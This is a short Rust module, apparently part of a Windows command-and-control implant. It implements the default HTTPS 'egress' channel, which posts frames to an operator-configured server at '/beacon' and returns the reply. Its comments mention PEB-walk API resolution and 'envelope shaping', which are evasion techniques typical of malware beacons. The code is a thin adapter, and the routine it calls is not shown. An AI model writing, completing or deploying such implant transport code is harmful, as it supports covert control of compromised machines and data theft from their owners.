//! HTTPS channel — the primary/default egress transport.
//!
//! Wraps the existing WinHTTP `post_frame()` from `transport.rs`. This is the
//! only fully-implemented channel in spec-1; all others are stubs until
//! their respective specs are implemented.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// Send `frame` as an HTTPS POST to `/beacon`, return the response body.
///
/// Delegates to `transport::post_frame()` — the original WinHTTP implementation
/// that handles PEB-walk resolution, TLS, envelope shaping, and cert validation.
/// This is a thin adapter so the dispatcher has a uniform `send_recv` signature.
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        crate::transport::post_frame(
            ctx.server_host.as_bytes(),
            ctx.server_port,
            b"/beacon",
            frame,
            ctx.use_tls,
        )
    }
}
